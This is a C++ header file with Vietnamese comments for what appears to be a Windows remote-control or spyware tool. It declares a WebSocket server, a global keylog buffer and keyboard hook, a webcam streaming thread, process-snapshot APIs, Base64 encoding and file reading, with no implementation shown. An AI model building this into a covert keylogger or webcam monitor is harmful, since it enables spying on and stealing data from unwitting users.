#pragma once

// CẤU HÌNH & THƯ VIỆN
#define WIN32_LEAN_AND_MEAN 
#define NOMINMAX 
#define ASIO_STANDALONE 
#define _WEBSOCKETPP_CPP11_TYPE_TRAITS_

// Thư viện C++ Chuẩn
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <thread>
#include <mutex>
#include <vector>
#include <memory>
#include <set>      
#include <fstream>  

// Thư viện Mạng
#include <websocketpp/config/asio_no_tls.hpp>
#include <websocketpp/server.hpp>
#include <nlohmann/json.hpp>

// Thư viện OpenCV
#include <opencv2/opencv.hpp>
#include <opencv2/imgcodecs.hpp>

#pragma warning(pop)

// Thư viện Windows & Đồ họa
#include <windows.h>
#include <tlhelp32.h> 
#include <shellapi.h> 
#include <objidl.h> 
#include <gdiplus.h>

#pragma comment(lib, "gdiplus.lib") 
#pragma comment(lib, "ws2_32.lib")

using namespace Gdiplus;
using json = nlohmann::json;
typedef websocketpp::server<websocketpp::config::asio> server;

// KHAI BÁO BIẾN TOÀN CỤC
extern std::string g_KeylogBuffer;
extern std::mutex g_LogMutex;
extern HHOOK g_hHook;
extern std::set<DWORD> g_PendingModifiers;
extern bool g_IsStreaming;
extern std::thread* g_WebcamThread;

// KHAI BÁO HÀM TIỆN ÍCH
std::string ToLower(std::string str);
bool IsKeyDown(int vk);
std::string Base64Encode(unsigned char const* bytes_to_encode, unsigned int in_len);
std::vector<unsigned char> ReadFileToBuffer(const std::string& filepath);